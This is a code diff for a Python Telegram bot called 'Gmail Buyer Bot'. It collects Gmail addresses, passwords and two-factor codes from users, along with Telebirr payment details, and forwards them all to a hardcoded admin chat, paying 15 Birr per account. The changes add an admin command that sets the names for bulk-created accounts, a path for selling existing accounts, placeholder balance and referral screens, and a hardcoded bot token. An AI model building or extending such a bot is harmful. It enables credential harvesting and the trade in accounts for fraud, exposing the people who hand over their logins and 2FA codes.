@@ -11,22 +11,96 @@ from telegram.ext import (
 # Steps for the conversation flow
 EMAIL, PASSWORD, TWO_FACTOR, TELEBIRR = range(4)
 
-# Start Command
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
-    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
-    await update.message.reply_text(
-        "Welcome to Gmail Buyer Bot! Click 'Register a new Gmail' to start.",
-        reply_markup=markup
-    )
+# Default specifications for new accounts
+CURRENT_SPECS = (
+    "📌 **SPECIFICATIONS FOR NEW ACCOUNT:**\n\n"
+    "Please create a new Gmail account using these details:\n"
+    "• **First Name:** John\n"
+    "• **Last Name:** Doe\n\n"
+    "Once created, please reply with the **Gmail address** you made:"
+)
 
-# Step 1: Ask for Email
-async def register_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Admin Command to change specifications live
+async def set_specs(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global CURRENT_SPECS
+    user_id = update.effective_user.id
+    
+    if user_id != 2103337926:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    new_specs_text = " ".join(context.args)
+    if not new_specs_text:
+        await update.message.reply_text(
+            "⚠️ Please provide the new specifications after the command.\n"
+            "Example: `/setspecs First Name: Alex | Last Name: Johnson`",
+            parse_mode="Markdown"
+        )
+        return
+
+    CURRENT_SPECS = f"📌 **SPECIFICATIONS FOR NEW ACCOUNT:**\n\n{new_specs_text}\n\nOnce created, please reply with the **Gmail address** you made:"
+    await update.message.reply_text("✅ Successfully updated the account specifications for users!")
+
+# Start Command with the full button layout matching your reference image + pricing details
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    reply_keyboard = [
+        ["➕ Register a new Gmail", "📁 My accounts"],
+        ["💰 Balance", "👥 My referrals"],
+        ["⚙️ Settings", "💬 Help"],
+        ["🤖 My Bot"]
+    ]
+    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+    
+    welcome_text = (
+        "👋 **Welcome to Gmail Buyer Bot!**\n\n"
+        "✨ **Current Payout Rates:**\n"
+        "• New Account (My Specs): **15 Birr**\n"
+        "• Existing Account (Old): **15 Birr**\n\n"
+        "Choose an option below to start earning:"
+    )
+    
+    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=markup)
+
+# Path A: Create Account based on your specs
+async def specs_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['submission_type'] = "Created via Your Specs (15 Birr)"
     await update.message.reply_text(
-        "Please enter the Gmail address you want to submit:",
+        CURRENT_SPECS,
+        parse_mode="Markdown",
         reply_markup=ReplyKeyboardRemove()
     )
     return EMAIL
+
+# Path B: Submit existing (old) account
+async def existing_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['submission_type'] = "Submitted Existing Account (15 Birr)"
+    await update.message.reply_text(
+        "📁 **Existing Account Submission (15 Birr)**\n\n"
+        "Please enter the **Gmail address** of your existing account:",
+        parse_mode="Markdown",
+        reply_markup=ReplyKeyboardRemove()
+    )
+    return EMAIL
+
+# Handle Balance menu click
+async def balance_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("💰 **Your Balance:**\n0.00 Birr\n\n(Payouts are processed after verification).")
+
+# Handle Referrals menu click
+async def referrals_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("👥 **Your Referral Link:**\nShare your bot link with friends to earn extra bonuses!")
+
+# Handle Settings menu click
+async def settings_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("⚙️ **Settings:**\nYour account is linked correctly.")
+
+# Handle Help menu click
+async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("💬 **Help & Support:**\nContact admin if you encounter any issues with submissions or payouts.")
+
+# Handle My Bot menu click
+async def my_bot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🤖 This bot automatically manages your Gmail verification tasks and payouts.")
 
 # Step 2: Save Email, ask for Password
 async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -51,32 +125,20 @@ async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Step 5: Save Telebirr, Send to Your Telegram, and Finish
 async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     telebirr_info = update.message.text
+    sub_type = context.user_data.get('submission_type', 'Standard')
     email = context.user_data.get('email')
     password = context.user_data.get('password')
     two_fa = context.user_data.get('2fa')
     
-    # Grab the user who submitted this
     user = update.effective_user
     user_id = user.id
     username = user.username if user.username else "No username"
     first_name = user.first_name
     
-    # Print submitted info + user details to your Render logs as backup
-    print("\n--- NEW SUBMISSION ---")
-    print(f"Telegram User ID: {user_id}")
-    print(f"Telegram Name: {first_name}")
-    print(f"Telegram Username: @{username}")
-    print(f"Gmail: {email}")
-    print(f"Password: {password}")
-    print(f"2FA: {two_fa}")
-    print(f"Telebirr: {telebirr_info}")
-    print("----------------------\n")
-
-    # Send submission directly to your personal Telegram chat ID
     my_admin_id = 2103337926  
     
     admin_message = (
-        f"🚨 **NEW GMAIL SUBMISSION** 🚨\n\n"
+        f"🚨 **NEW SUBMISSION ({sub_type})** 🚨\n\n"
         f"👤 **User Name:** {first_name}\n"
         f"🆔 **User ID:** `{user_id}`\n"
         f"🔗 **Username:** @{username}\n\n"
@@ -88,11 +150,18 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await context.bot.send_message(chat_id=my_admin_id, text=admin_message, parse_mode="Markdown")
 
-    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
+    context.user_data.clear()
+
+    reply_keyboard = [
+        ["➕ Register a new Gmail", "📁 My accounts"],
+        ["💰 Balance", "👥 My referrals"],
+        ["⚙️ Settings", "💬 Help"],
+        ["🤖 My Bot"]
+    ]
     markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
     
     await update.message.reply_text(
-        "Submission received! Your account is pending verification and payout.",
+        "Submission received! Your account is pending verification and 15 Birr payout.",
         reply_markup=markup
     )
     return ConversationHandler.END
@@ -102,13 +171,15 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 if __name__ == '__main__':
-    # Your token from BotFather
     BOT_TOKEN = "8941199738:AAFs0IivEoEecPtmheF-bK5KZ3wqOGQreHo"
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     conv_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Regex("^Register a new Gmail$"), register_start)],
+        entry_points=[
+            MessageHandler(filters.Regex("^➕ Register a new Gmail$"), specs_start),
+            MessageHandler(filters.Regex("^📁 My accounts$"), existing_start)
+        ],
         states={
             EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
             PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
@@ -119,7 +190,15 @@ if __name__ == '__main__':
     )
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("setspecs", set_specs))
     app.add_handler(conv_handler)
+    
+    # Menu button handlers
+    app.add_handler(MessageHandler(filters.Regex("^💰 Balance$"), balance_handler))
+    app.add_handler(MessageHandler(filters.Regex("^👥 My referrals$"), referrals_handler))
+    app.add_handler(MessageHandler(filters.Regex("^⚙️ Settings$"), settings_handler))
+    app.add_handler(MessageHandler(filters.Regex("^💬 Help$"), help_handler))
+    app.add_handler(MessageHandler(filters.Regex("^🤖 My Bot$"), my_bot_handler))
 
     print("Bot is running...")
     app.run_polling()
